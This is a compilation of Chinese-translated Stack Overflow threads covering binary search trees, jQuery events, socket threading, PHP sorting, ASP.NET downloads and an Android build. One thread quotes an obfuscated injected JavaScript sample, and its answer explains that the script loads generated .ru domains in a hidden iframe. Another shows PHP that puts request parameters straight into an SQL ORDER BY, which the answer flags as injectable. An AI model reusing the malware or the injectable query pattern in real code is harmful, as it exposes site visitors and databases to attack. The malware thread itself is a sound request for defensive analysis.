        //If the right subtree of node x is empty and x has a successor y, then y is the lowest ancestor of x whose 
        //left child is also an ancestor of x. 
        else
        {
            TreeNode succ = null;

            // Start from root and search for successor down the tree
            while (root != null)
            {
                //in-order tree walk....                    
                if ((int)toFind.data < (int)root.data)
                {
                    succ = root;
                    root = root.left;
                }
                else if ((int)toFind.data > (int)root.data)
                    root = root.right;
                else
                    break;
            }

            return succ;
        }
    } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-03-24T10:59:34.087

```
Inorder sucessor in BST..
private TreeNode treeInorderSuccessor(TreeNode root, int data) {
    System.out.println("called");
    TreeNode keyNode = searchTreeNode(root, data);
    if(keyNode == null){
        return keyNode;
    }else{
        if(keyNode.right != null){
            root = findMinFromRight(keyNode.right);
            return root;
        }else{
            TreeNode suc = null;
            TreeNode anc = root;
            while(anc != keyNode){
                if(anc.data > keyNode.data){
                    suc = anc;
                    anc = anc.left;
                }else{
                    anc = anc.right;
                }
            }
            return suc;
        }
    }
} 
private TreeNode searchTreeNode(TreeNode root, int data) {
    if(root == null){
        System.out.println("node not found");
    }else{
        if(root.data == data){
            System.out.println("node found");
        }else if(root.data >= data){
            root = searchTreeNode(root.left, data);
        }else if(root.data < data){
            root = searchTreeNode(root.right, data);
        }
    }
    return root;
}

private TreeNode findMinFromRight(TreeNode node) {
    while(node.left != null){
        node = node.left;
    }
    return node;
} 
```

# javascript - km0ae9gr6m js注入破解信息

> ID：11235539
> 
> 赞同：9
> 
> 时间：2012-06-27T22:12:51.260
> 
> 标签：javascript, code-injection

1.  只是想知道一个 js 专家是否可以解码这个脚本注入，我可以检查我们的服务器是否有进一步的感染。

2.  有没有人知道这是怎么发生的？服务器已完全修补（MS Server 2008，Plesk），Web 应用程序已完全修补（DNN 5.6.7）。

3.  已删除所有注入的脚本并重置所有服务器密码。我还应该做什么？

谢谢 ：）

```
/*km0ae9gr6m*/
i = 0;
try {
    prototype - 5;
} catch (z) {
    f = [102, 234, 110, 198, 116, 210, 111, 220, 32, 220, 101, 240, 116, 164, 97, 220, 100, 222, 109, 156, 117, 218, 98, 202, 114, 80, 41, 246, 118, 194, 114, 64, 104, 210, 61, 232, 104, 210, 115, 92, 115, 202, 101, 200, 47, 232, 104, 210, 115, 92, 81, 118, 118, 194, 114, 64, 108, 222, 61, 232, 104, 210, 115, 92, 115, 202, 101, 200, 37, 232, 104, 210, 115, 92, 81, 118, 118, 194, 114, 64, 116, 202, 115, 232, 61, 232, 104, 210, 115, 92, 65, 84, 108, 222, 45, 232, 104, 210, 115, 92, 82, 84, 104, 210, 59, 210, 102, 80, 116, 202, 115, 232, 62, 96, 41, 246, 116, 208, 105, 230, 46, 230, 101, 202, 100, 122, 116, 202, 115, 232, 125, 202, 108, 230, 101, 246, 116, 208, 105, 230, 46, 230, 101, 202, 100, 122, 116, 202, 115, 232, 43, 232, 104, 210, 115, 92, 77, 250, 114, 202, 116, 234, 114, 220, 40, 232, 104, 210, 115, 92, 115, 202, 101, 200, 42, 232, 104, 210, 115, 92, 111, 220, 101, 158, 118, 202, 114, 154, 41, 250, 102, 234, 110, 198, 116, 210, 111, 220, 32, 164, 97, 220, 100, 222, 109, 156, 117, 218, 98, 202, 114, 142, 101, 220, 101, 228, 97, 232, 111, 228, 40, 234, 110, 210, 120, 82, 123, 236, 97, 228, 32, 200, 61, 220, 101, 238, 32, 136, 97, 232, 101, 80, 117, 220, 105, 240, 42, 98, 48, 96, 48, 82, 59, 236, 97, 228, 32, 230, 61, 200, 46, 206, 101, 232, 72, 222, 117, 228, 115, 80, 41, 124, 49, 100, 63, 98, 58, 96, 59, 232, 104, 210, 115, 92, 115, 202, 101, 200, 61, 100, 51, 104, 53, 108, 55, 112, 57, 96, 49, 86, 40, 200, 46, 206, 101, 232, 77, 222, 110, 232, 104, 80, 41, 84, 48, 240, 70, 140, 70, 140, 70, 140, 41, 86, 40, 200, 46, 206, 101, 232, 68, 194, 116, 202, 40, 82, 42, 96, 120, 140, 70, 140, 70, 82, 43, 80, 77, 194, 116, 208, 46, 228, 111, 234, 110, 200, 40, 230, 42, 96, 120, 140, 70, 140, 41, 82, 59, 232, 104, 210, 115, 92, 65, 122, 52, 112, 50, 110, 49, 118, 116, 208, 105, 230, 46, 154, 61, 100, 49, 104, 55, 104, 56, 102, 54, 104, 55, 118, 116, 208, 105, 230, 46, 162, 61, 232, 104, 210, 115, 92, 77, 94, 116, 208, 105, 230, 46, 130, 59, 232, 104, 210, 115, 92, 82, 122, 116, 208, 105, 230, 46, 154, 37, 232, 104, 210, 115, 92, 65, 118, 116, 208, 105, 230, 46, 222, 110, 202, 79, 236, 101, 228, 77, 122, 49, 92, 48, 94, 116, 208, 105, 230, 46, 154, 59, 232, 104, 210, 115, 92, 110, 202, 120, 232, 61, 220, 101, 240, 116, 164, 97, 220, 100, 222, 109, 156, 117, 218, 98, 202, 114, 118, 114, 202, 116, 234, 114, 220, 32, 232, 104, 210, 115, 250, 102, 234, 110, 198, 116, 210, 111, 220, 32, 198, 114, 202, 97, 232, 101, 164, 97, 220, 100, 222, 109, 156, 117, 218, 98, 202, 114, 80, 114, 88, 77, 210, 110, 88, 77, 194, 120, 82, 123, 228, 101, 232, 117, 228, 110, 64, 77, 194, 116, 208, 46, 228, 111, 234, 110, 200, 40, 80, 77, 194, 120, 90, 77, 210, 110, 82, 42, 228, 46, 220, 101, 240, 116, 80, 41, 86, 77, 210, 110, 82, 125, 204, 117, 220, 99, 232, 105, 222, 110, 64, 103, 202, 110, 202, 114, 194, 116, 202, 80, 230, 101, 234, 100, 222, 82, 194, 110, 200, 111, 218, 83, 232, 114, 210, 110, 206, 40, 234, 110, 210, 120, 88, 108, 202, 110, 206, 116, 208, 44, 244, 111, 220, 101, 82, 123, 236, 97, 228, 32, 228, 97, 220, 100, 122, 110, 202, 119, 64, 82, 194, 110, 200, 111, 218, 78, 234, 109, 196, 101, 228, 71, 202, 110, 202, 114, 194, 116, 222, 114, 80, 117, 220, 105, 240, 41, 118, 118, 194, 114, 64, 108, 202, 116, 232, 101, 228, 115, 122, 91, 78, 97, 78, 44, 78, 98, 78, 44, 78, 99, 78, 44, 78, 100, 78, 44, 78, 101, 78, 44, 78, 102, 78, 44, 78, 103, 78, 44, 78, 104, 78, 44, 78, 105, 78, 44, 78, 106, 78, 44, 78, 107, 78, 44, 78, 108, 78, 44, 78, 109, 78, 44, 78, 110, 78, 44, 78, 111, 78, 44, 78, 112, 78, 44, 78, 113, 78, 44, 78, 114, 78, 44, 78, 115, 78, 44, 78, 116, 78, 44, 78, 117, 78, 44, 78, 118, 78, 44, 78, 119, 78, 44, 78, 120, 78, 44, 78, 121, 78, 44, 78, 122, 78, 93, 118, 118, 194, 114, 64, 115, 232, 114, 122, 39, 78, 59, 204, 111, 228, 40, 236, 97, 228, 32, 210, 61, 96, 59, 210, 60, 216, 101, 220, 103, 232, 104, 118, 105, 86, 43, 82, 123, 230, 116, 228, 43, 122, 108, 202, 116, 232, 101, 228, 115, 182, 99, 228, 101, 194, 116, 202, 82, 194, 110, 200, 111, 218, 78, 234, 109, 196, 101, 228, 40, 228, 97, 220, 100, 88, 48, 88, 108, 202, 116, 232, 101, 228, 115, 92, 108, 202, 110, 206, 116, 208, 45, 98, 41, 186, 125, 228, 101, 232, 117, 228, 110, 64, 115, 232, 114, 86, 39, 92, 39, 86, 122, 222, 110, 202, 125, 230, 101, 232, 84, 210, 109, 202, 111, 234, 116, 80, 102, 234, 110, 198, 116, 210, 111, 220, 40, 82, 123, 232, 114, 242, 123, 210, 102, 80, 116, 242, 112, 202, 111, 204, 32, 210, 102, 228, 97, 218, 101, 174, 97, 230, 67, 228, 101, 194, 116, 202, 100, 100, 61, 122, 34, 234, 110, 200, 101, 204, 105, 220, 101, 200, 34, 82, 123, 210, 102, 228, 97, 218, 101, 174, 97, 230, 67, 228, 101, 194, 116, 202, 100, 100, 61, 232, 114, 234, 101, 118, 118, 194, 114, 64, 117, 220, 105, 240, 61, 154, 97, 232, 104, 92, 114, 222, 117, 220, 100, 80, 43, 220, 101, 238, 32, 136, 97, 232, 101, 80, 41, 94, 49, 96, 48, 96, 41, 118, 118, 194, 114, 64, 100, 222, 109, 194, 105, 220, 78, 194, 109, 202, 61, 206, 101, 220, 101, 228, 97, 232, 101, 160, 115, 202, 117, 200, 111, 164, 97, 220, 100, 222, 109, 166, 116, 228, 105, 220, 103, 80, 117, 220, 105, 240, 44, 98, 54, 88, 39, 228, 117, 78, 41, 118, 105, 204, 114, 218, 61, 200, 111, 198, 117, 218, 101, 220, 116, 92, 99, 228, 101, 194, 116, 202, 69, 216, 101, 218, 101, 220, 116, 80, 34, 146, 70, 164, 65, 154, 69, 68, 41, 118, 105, 204, 114, 218, 46, 230, 101, 232, 65, 232, 116, 228, 105, 196, 117, 232, 101, 80, 34, 230, 114, 198, 34, 88, 34, 208, 116, 232, 112, 116, 47, 94, 34, 86, 100, 222, 109, 194, 105, 220, 78, 194, 109, 202, 43, 68, 47, 228, 117, 220, 102, 222, 114, 202, 115, 232, 114, 234, 110, 126, 115, 210, 100, 122, 99, 240, 34, 82, 59, 210, 102, 228, 109, 92, 115, 232, 121, 216, 101, 92, 119, 210, 100, 232, 104, 122, 34, 96, 112, 240, 34, 118, 105, 204, 114, 218, 46, 230, 116, 242, 108, 202, 46, 208, 101, 210, 103, 208, 116, 122, 34, 96, 112, 240, 34, 118, 105, 204, 114, 218, 46, 230, 116, 242, 108, 202, 46, 236, 105, 230, 105, 196, 105, 216, 105, 232, 121, 122, 34, 208, 105, 200, 100, 202, 110, 68, 59, 200, 111, 198, 117, 218, 101, 220, 116, 92, 98, 222, 100, 242, 46, 194, 112, 224, 101, 220, 100, 134, 104, 210, 108, 200, 40, 210, 102, 228, 109, 82, 125, 250, 99, 194, 116, 198, 104, 80, 101, 82, 123, 250, 125, 88, 53, 96, 48, 82, 59];
'REMOVED BULK OF CODE
if (f) e(s); /*qhk6sa6g1c*/ 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-09-04T22:14:21.280

该代码最终会生成半随机域名（在 .ru 中），然后尝试将它们加载到隐藏的 iframe 中。相关部分是：

```
domainName=generatePseudoRandomString(unix,16,'ru') 
```

和：

```
ifrm.setAttribute("src","http://"+domainName+"/runforestrun?sid=cx") 
```

毫无疑问，从任何一个作品下载的内容都是某种邪恶的......

# php - 根据选择的排序动态更改结果

> ID：11235546
> 
> 赞同：0
> 
> 时间：2012-06-27T22:13:16.750
> 
> 标签：php, javascript, mysql, html

我一直在尝试对我的 php 结果进行动态排序，但是由于某种原因，它什么也没做，如果我尝试更改下拉列表中的排序字段，什么也没有发生，我无法弄清楚.

这是php代码

```
 $sortorder = "ASC";
$sortfield = "addon_name";

if(isset($_GET["sortorder"])) {
$sortorder = $_GET["sortorder"];
}
if(isset($_GET["sortfield"])) {
$sortfield= $_GET["sortfield"];
}

        $small_statement = "`addons` WHERE addon_size='small' ORDER BY $sortfield $sortorder"; 
```

这是html代码

```
 <select name="sortorder" onChange="MM_jumpMenu('parent',this,0)">
<option value="?sortorder=ASC">Ascending</option>
<option value="?sortorder=DSC">Descending</option>
</select>

<select name="sortfield" onChange="MM_jumpMenu('parent',this,0)">
<option value="?sortfield=addon_name">Name</option>
<option value="?sortfield=addon_rank">Rank</option>
</select></div><!---end browse_header--->
    <div id="small" class="tab_content">

    <?php 
          $browse_small_query = mysql_query("SELECT * FROM {$small_statement} LIMIT {$startpoint_small} , {$limit}");

          while($row_small = mysql_fetch_assoc($browse_small_query)) : ?>
            <?php extract($row_small);?>

                <div class="addon_wrapper" onclick="location.href='addon_detail.php?eid=<?php print "$estate_id";?> &aid=<?php print "$addon_id";?>';"><div class="addon_header"><?php print "$addon_name";?><?php print "$addon_id";?></div><!---end addon_wrapper---><div class="addon_browse_image"></div><!---end addon_browse_image---></div><!---end addon_wrapper--->
        <?php endwhile ?> 
```

感谢您的任何帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T22:15:00.930

你`<option>`的 s 有错误的价值观。您不需要变量的名称，因为`<select name="XXX"`. 值应该是

```
<option value="ASC">Ascending</option>
<option value="DESC">Descending</option> 
```

其他两个类似。

您也可以通过检查内部的值来自己调试它`$_GET`。

最后，**此代码易受 SQL 注入攻击，**因为任何人都可以使用他们想要的两个参数值提交请求。您应该使用白名单或使用一种[标准的防御方法](https://stackoverflow.com/questions/60174/best-way-to-prevent-sql-injection-in-php)来保护自己。

# django - Django 逗号分隔的模型表单字段

> ID：11235548
> 
> 赞同：1
> 
> 时间：2012-06-27T22:13:56.677
> 
> 标签：django, django-models, django-forms

我正在寻找一个`ModelForm`接受逗号分隔值并将值作为行存储在数据库中的字段（作为与另一个对象的多对一关系）

我试过寻找这样的东西，但没有运气。我正在考虑通过正常手动操作，`Form`但在此之前，我想听听建议。有没有一种简单的方法可以做到这一点？自定义小部件？自定义字段？两个都？

# jquery - jQuery：选择选择选项时，如何触发事件 /做某事？

> ID：11235554
> 
> 赞同：1
> 
> 时间：2012-06-27T22:14:08.427
> 
> 标签：jquery

一旦单击并选择了选择选项，谁能告诉我触发事件的最佳方式？

一旦用户选择了他们的选项，我想运行一些额外的 JavaScript。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-27T22:18:19.110

使用[`$.change()`](http://api.jquery.com/change/)事件：

```
$('select').change(function() {
    // Additional JavaScript
}); 
```

要获取所选选项的值，请`$(this).val()`在函数范围内使用，如下所示：

```
$('select').change(function() {
    alert($(this).val());
}); 
```

* * *

如果您使用的是 jQuery 1.7+，则可以将其`$.on()`与任何其他事件一起使用：

```
$('select').on('change', function() {
    // Additional JavaScript
}); 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-06-27T22:16:09.433

```
$('#my-select').change(function(){ 
  //do stuff here, eg. 
  if ($(this).val() == 'xyz') { //check the selected option etc.
     //do more stuff
  }
}); 
```

# multithreading - 为什么线程用于套接字？

> ID：11235557
> 
> 赞同：1
> 
> 时间：2012-06-27T22:14:37.800
> 
> 标签：multithreading, sockets, networking, thread-safety

自从我发现套接字以来，我一直在使用非阻塞变体，因为我不想费心学习线程。从那以后，我在线程方面积累了更多经验，我开始问自己......你为什么要把它用于套接字？

线程的一个大前提似乎是它们只有在处理自己的数据集时才有意义。一旦您有两个线程处理同一组数据，您将遇到以下情况：

```
if(!hashmap.hasKey("bar"))
{
  dostuff               // <-- meanwhile another thread inserts "bar" into hashmap
  hashmap[bar] = "foo"; // <-- our premise that the key didn't exist
                        //     (likely to avoid overwriting something) is now invalid
} 
```

现在想象一下 hashmap 将远程 IP 映射到密码。你可以看到我要去哪里。我的意思是，当然，这种线程交互出错的可能性很小，但它仍然存在，为了保证程序的安全，你必须考虑每一种可能性。与简单的单线程工作流相比，这将显着增加设计工作量。

我可以完全看到线程对于处理单独的数据集或对于显式优化以使用线程的程序是多么的好。但是对于“一般”情况，程序员只关心发送一个工作和安全的程序，我找不到任何理由使用线程而不是轮询。

但是看到“单独的线程”方法非常普遍，也许我忽略了一些东西。开导我！:)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-27T23:55:43.627

使用带有套接字的线程有两个常见的原因，一个好一个不太好：

很好的理由：因为您的计算机有多个 CPU 内核，并且您想利用额外的内核。单线程程序只能使用一个核心，因此在繁重的工作负载下，您会将一个核心固定在 100%，而其他核心则闲置并浪费掉。

不太好的原因：您想使用阻塞 I/O 来简化程序的逻辑——特别是，您希望避免处理部分读取和部分写入，并将每个套接字的上下文/状态保留在它关联的线程。但是您还希望能够一次处理多个客户端，而不会导致慢速客户端 A 导致 I/O 调用阻塞并推迟对快速客户端 B 的处理。

第二个原因不太好的原因是，虽然每个套接字有一个线程似乎简化了程序的设计，但实际上它通常会使它复杂化。它引入了竞争条件和死锁的可能性，并使得难以安全地访问共享数据（如您所述）。更糟糕的是，如果您坚持阻塞 I/O，则很难干净地关闭程序（或以任何其他方式从线程套接字以外的任何地方影响线程的行为），因为线程通常在 I/O 中被阻塞O 呼叫（可能无限期地）没有可靠的方法来唤醒它。（信号在多线程程序中不能可靠地工作，回到非阻塞 I/O 意味着您失去了您希望的简化程序结构）

简而言之，我同意 cib - 多线程服务器可能会出现问题，因此通常应该避免使用，除非您绝对需要使用多个内核 - 即使那样，为了安全起见，使用多进程而不是多线程可能会更好清酒。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-27T23:58:47.583

线程最大的好处是可以防止处理请求时累积的延迟时间。轮询时，您使用循环来为每个套接字提供状态更改服务。对于少数客户来说，这不是很明显，但是在与大量客户打交道时可能会导致严重延误。

假设每个事务都需要一些预处理和后处理（取决于协议，这可能是微不足道的处理量，或者可能像 BEEP 或 SOAP 那样相对重要）。预处理/后处理请求的总时间可能会导致待处理请求的积压。

出于说明目的，假设请求的预处理、处理和后处理阶段各消耗 1 微秒，因此完成总请求需要 3 微秒。在单线程环境中，如果传入的请求超过每秒 334 个请求（因为在 1 秒的时间内处理所有收到的请求需要 1.002 秒），系统将不堪重负，导致每秒 0.002 秒的时间不足。但是，如果系统使用线程，那么理论上可能只需要 0.336 秒 *（共享数据访问 0.334 + 0.001 预处理 + 0.001 后处理）的处理时间来完成在 1 秒内收到的所有请求时间段。

虽然理论上可以在 0.336 秒内处理所有请求，但这将要求每个请求都有自己的线程。更合理的做法是将组合的前/后处理时间（0.668 秒）乘以请求数并除以配置的线程数。例如，使用相同的 334 个传入请求和处理时间，理论上 2 个线程将在 0.668 秒内完成所有请求（0.668 / 2 + 0.334），4 个线程在 0.501 秒内完成，8 个线程在 0.418 秒内完成。

如果您的守护程序接收的最高请求量相对较低，那么具有非阻塞 I/O 的单线程实现就足够了，但是如果您预计偶尔会出现大量请求，那么值得考虑使用多线程模型。

我已经编写了多个吞吐量相对较低的 UNIX 守护程序，并且为了简单起见，我使用了单线程。但是，当我为 ISP 编写自定义 netflow 接收器时，我为守护进程使用了​​线程模型，它能够处理 Internet 使用的高峰时间，而系统负载平均波动最小。

# asp.net - 直接下载和间接下载网页文件的区别

> ID：11235560
> 
> 赞同：0
> 
> 时间：2012-06-27T22:14:44.863
> 
> 标签：asp.net, download, httpresponse, swfobject

在我的网络服务器上，我有一个名为`03.mp4`.
我有一个页面（videoserver.aspx）使用以下代码提供该文件

```
Response.ContentType = "application/octet-stream";
Response.AppendHeader("Content-Disposition", "attachment; filename=video.mp4");
Response.TransmitFile(Server.MapPath("03.mp4"));
Response.End(); 
```

这两个电话有什么区别？
1：`http://localhost/media/03.mp4`
2：`http://localhost/media/videoserver.aspx?q=03`

当我直接在浏览器中指向这些 URL 时，在这两种情况下都会提示我保存对话框。
我有另一个具有 SWFObject 的网页。它使用视频作为输入。行。当我输入 URL 1 时，它会加载视频。
当我提供 URL 2 时，它不会加载视频。

为什么会有这种差异？我更喜欢 URL 2，因为您可以根据查询字符串动态更改您提供给消费者的视频。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T22:41:16.113

许多视频播放器，包括新的 HTML5`<video>`元素，都需要使用 HTTP 标头支持所谓的字节范围请求[`Range`](http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.35)。这通常已经内置在一个有点自尊的 HTTP 服务器中。基本上，为了通知客户端请求的 URL 支持字节范围请求，服务器应该返回[`Accept-Ranges: bytes`](http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.5)响应并能够`Range`通过按照规范将请求的字节范围准确地返回到响应来处理所有传入的请求（参见`Range`标题上的第一个链接以获取详细信息）。

因此，如果您选择完全由您自己处理 HTTP 响应，而不是让 HTTP 服务器完成其设计的工作，您必须仔细考虑这一点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-06T04:47:05.677

因此，它证明我是 SWFObject 的新手。
我所指的 SWFObject 是由 Camtasia 提供的，它通过 FLashVars 接受 mp4 文件。
问题是“为什么它在接受 URL 1 时不接受 URL 2？”。答案是，URL 2 不是以`.mp4`.
然后我的问题的解决方案是，创建一个接受`*/media/*.mp4`路径并返回适当文件内容的处理程序，在我的情况下，这些内容是从数据库中获取的。

# php - 查找页面中的所有href并替换为维护先前链接的链接 - PHP

> ID：11235562
> 
> 赞同：4
> 
> 时间：2012-06-27T22:15:13.010
> 
> 标签：php, hyperlink, text-processing

我正在尝试查找网页上的所有 href 链接并将链接替换为我自己的代理链接。

例如

```
<a href="http://www.google.com">Google</a> 
```

需要是

```
<a href="http://www.example.com/?loadpage=http://www.google.com">Google</a> 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-27T22:21:52.087

使用 PHP`DomDocument`解析页面

```
$doc = new DOMDocument();

// load the string into the DOM (this is your page's HTML), see below for more info
$doc->loadHTML('<a href="http://www.google.com">Google</a>');

//Loop through each <a> tag in the dom and change the href property
foreach($doc->getElementsByTagName('a') as $anchor) {
    $link = $anchor->getAttribute('href');
    $link = 'http://www.example.com/?loadpage='.urlencode($link);
    $anchor->setAttribute('href', $link);
}
echo $doc->saveHTML(); 
```

在这里查看：http: [//codepad.org/9enqx3Rv](http://codepad.org/9enqx3Rv)

如果您没有将 HTML 作为字符串，您可以使用 cUrl ( [docs](http://php.net/manual/en/book.curl.php) ) 来获取 HTML，或者您可以`loadHTMLFile`使用`DomDocument`

**文档**

*   `DomDocument`- [http://php.net/manual/en/class.domdocument.php](http://php.net/manual/en/class.domdocument.php)
*   `DomElement`- [http://www.php.net/manual/en/class.domelement.php](http://www.php.net/manual/en/class.domelement.php)
*   `DomElement::getAttribute`- [http://www.php.net/manual/en/domelement.getattribute.php](http://www.php.net/manual/en/domelement.getattribute.php)
*   `DOMElement::setAttribute`- [http://www.php.net/manual/en/domelement.setattribute.php](http://www.php.net/manual/en/domelement.setattribute.php)
*   `urlencode`- [http://php.net/manual/en/function.urlencode.php](http://php.net/manual/en/function.urlencode.php)
*   `DomDocument::loadHTMLFile`- [http://www.php.net/manual/en/domdocument.loadhtmlfile.php](http://www.php.net/manual/en/domdocument.loadhtmlfile.php)
*   cURL - [http://php.net/manual/en/book.curl.php](http://php.net/manual/en/book.curl.php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-03T16:37:31.187

如果您想用 jQuery 替换链接，这只是另一种选择，您还可以执行以下操作：

```
$(document).find('a').each(function(key, element){
   curValue = element.attr('href');
   element.attr('href', 'http://www.example.com?loadpage='+curValue);

}); 
```

然而，更安全的方法是在 php offcourse 中进行。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-06-27T22:23:13.097

我能想到的最简单的方法是：

```
$loader = "http://www.example.com?loadpage=";
$page_contents = str_ireplace(array('href="', "href='"), array('href="'.$loader, "href='".$loader), $page_contents); 
```

但这可能对包含 ? 或者 ＆。或者如果文档的文本（不是代码）包含 href="

# google-chrome - CHROME 中未捕获的 TypeError

> ID：11235563
> 
> 赞同：0
> 
> 时间：2012-06-27T22:15:18.683
> 
> 标签：google-chrome, popup

我之前问过同样的问题。但它在 CHROME 上仍然有错误，但它在 IE 上运行良好。父 html 调用 mycoupon3.jsp 作为弹出窗口，如果选择了弹出窗口中的一行，它会将 INNERHTML 发送到父 html。

问题是，弹出窗口中的数据未处理到父 html。在 chrome 调试工具上说 Uncaught TypeError: Cannot read property 'tot' of undefined on "opener.document.joinform.all["tot"].innerHTML"。弹出窗口也不会self.close。

我认为 all["tot"] 与 chrome 不兼容。于是改成了 opener.document.joinform.getelementbyid["tot"].innerHTML，但是没有运气。

这是代码。

```
<parent html>

 <td id="tot" class="text_orange"><%=NumberFormat.getInstance().format(cmbean.getTotal())%> USD</td>

 <a href="javascript: mycoupon()"><img src="/images/main/mycoupon_btn.gif" border="0"></a>

<script>

var new_window_handle;  

function mycoupon() {     
new_window_handle = window.open("my_coupon3.jsp?amt=<%=pay_price2%>", 'coupon_win', 'toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes, resizable=no,width=780,height=540'); 
} 

</script>   

<my_coupon3.jsp> * POPUP window

<script>
function sel_coupon(c_id, amt) {
var tot = opener.document.joinform.Org_totalprice.value ;
tot = String( Number(tot) - Number(amt) ) ;
opener.document.joinform.totalprice.value = tot;
opener.document.joinform.coupon_id.value = c_id ;
opener.document.joinform.all["tot"].innerHTML = maskNum    (opener.document.joinform.Org_totalprice.value) + "USD - " + maskNum(amt) +" USD &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b><font color='red'>TOTAL : " + maskNum(tot) + " USD</font></b> ";
opener.cal_payment_money() ;
self.close();
}
</script>

<a href="javascript: sel_coupon('BGG30055901', '3000')"> Apply This coupon</a> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T22:18:37.403

`getElementById`不是对象，而是函数。叫它：

```
document.getElementById('tot') 
```

请注意，您必须将其应用于`document`; 个别元素没有`getElementById`。这也是使用的问题`.all`；虽然 Chrome 支持`all`是为了与为 Internet Explorer 设计的页面兼容，但它只支持它作为`document`.

# wordpress - 永久链接结构 wordpress

> ID：11235566
> 
> 赞同：1
> 
> 时间：2012-06-27T22:16:09.090
> 
> 标签：wordpress, redirect, permalinks

如果变量位于帖子名称的末尾，我希望让用户转到不同的模板。所以我希望[http://www.google.com/%category%/%postname%/google/](http://www.google.com/%category%/%postname%/google/)传入变量 google 并更改页面和[http://www.google.com/%category%/%postname %/yahoo/](http://www.google.com/%category%/%postname%/yahoo/)传入变量 yahoo。我知道这已经用页面模板和变量完成了，但我不知道它是否已经完成了一个 postname 结束。

# java - Java如何与http网页上的按钮交互？

> ID：11235569
> 
> 赞同：1
> 
> 时间：2012-06-27T22:16:31.477
> 
> 标签：java, http, button, webpage

我对网络编程知之甚少，我正在查看很多示例，这些示例提供了很多关于在网页上编写以供网络浏览器查看的示例，但没有关于在用户按下网页按钮时获取请求的内容。

例如，打开服务器时，它打开了80端口，然后我想去网络浏览器并输入“localhost:80”来访问服务器客户端制作的网页。该网页有一个按钮，当我单击它时，网页会变为“已单击！”之类的其他内容。

有人可以给我看一个示例代码吗？链接到一个例子也很好。

非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T22:21:08.577

我建议使用 Apache 之类的东西[`HttpClient`](http://hc.apache.org/httpcomponents-client-ga/)来模仿按钮按下，这只是一个*HTTP POST*。如果您不想使用第三方库，标准 Java 库已经推出了自己的库。

# android - Android 源代码编译错误

> ID：11235570
> 
> 赞同：1
> 
> 时间：2012-06-27T22:16:38.903
> 
> 标签：android, linux, build, compiler-errors, makefile

*我在构建Android*时遵循了这些步骤：

1.  [http://source.android.com/source/initializing.html](http://source.android.com/source/initializing.html)
2.  [http://source.android.com/source/downloading.html](http://source.android.com/source/downloading.html)
3.  [http://source.android.com/source/building.html](http://source.android.com/source/building.html)

注意：我正在运行 Linux Mint 13 64 位。（而且我几乎是 linux 的新手）。

到目前为止，我遇到了很多问题，我已经通过谷歌搜索解决了，而且我完全有可能搞砸了我不应该遇到的事情。我目前面临的并且我无法规避/解决的问题如下：

在第三步（构建）中，发出命令 make -j4 时，我得到以下输出：

```
============================================
PLATFORM_VERSION_CODENAME=AOSP
PLATFORM_VERSION=4.0.4.0.4.0.4
TARGET_PRODUCT=full
TARGET_BUILD_VARIANT=eng
TARGET_BUILD_TYPE=release
TARGET_BUILD_APPS=
TARGET_ARCH=arm
TARGET_ARCH_VARIANT=armv7-a
HOST_ARCH=x86
HOST_OS=linux
HOST_OS_EXTRA=Linux-3.2.0-23-generic-x86_64-with-LinuxMint-13-maya
HOST_BUILD_TYPE=release
BUILD_ID=OPENMASTER
OUT_DIR=out
============================================
host Executable: acp (out/host/linux-x86/obj/EXECUTABLES/acp_intermediates/acp)
host Executable: aapt (out/host/linux-x86/obj/EXECUTABLES/aapt_intermediates/aapt)
/usr/bin/ld: skipping incompatible /usr/lib/gcc/x86_64-linux-gnu/4.6/libstdc++.so when searching for -lstdc++
/usr/bin/ld: skipping incompatible /usr/lib/gcc/x86_64-linux-gnu/4.6/libstdc++.a when searching for -lstdc++
/usr/bin/ld: cannot find -lstdc++
collect2: ld returned 1 exit status
make: *** [out/host/linux-x86/obj/EXECUTABLES/acp_intermediates/acp] Error 1
make: *** Waiting for unfinished jobs....
host Executable: aidl (out/host/linux-x86/obj/EXECUTABLES/aidl_intermediates/aidl)
logtags: out/target/common/obj/JAVA_LIBRARIES/framework_intermediates/src/telephony/java/com/android/internal/telephony/EventLogTags.java <= frameworks/base/telephony/java/com/android/internal/telephony/EventLogTags.logtags
/usr/bin/ld: cannot find -lz
/usr/bin/ld: skipping incompatible /usr/lib/gcc/x86_64-linux-gnu/4.6/libstdc++.so when searching for -lstdc++
/usr/bin/ld: skipping incompatible /usr/lib/gcc/x86_64-linux-gnu/4.6/libstdc++.a when searching for -lstdc++
/usr/bin/ld: cannot find -lstdc++
collect2: ld returned 1 exit status
make: *** [out/host/linux-x86/obj/EXECUTABLES/aapt_intermediates/aapt] Error 1
/usr/bin/ld: skipping incompatible /usr/lib/gcc/x86_64-linux-gnu/4.6/libstdc++.so when searching for -lstdc++
/usr/bin/ld: skipping incompatible /usr/lib/gcc/x86_64-linux-gnu/4.6/libstdc++.a when searching for -lstdc++
/usr/bin/ld: cannot find -lstdc++
collect2: ld returned 1 exit status
make: *** [out/host/linux-x86/obj/EXECUTABLES/aidl_intermediates/aidl] Error 1 
```

ps：请随时向我询问有关我的环境的更多详细信息，我将提供它，只是我不确定还包括什么，我不想让这篇文章变得密集阅读。

谢谢你的帮助。

@homer_simpson 我想我用“sudo apt-get install zlib1g-dev”解决了丢失的 libz 开发包

但是当我尝试“sudo apt-get install libstdc++”时，我得到以下输出：

```
Reading package lists... Done
Building dependency tree       
Reading state information... Done
Note, selecting 'libstdc++-dev-armel-cross' for regex 'libstdc+'
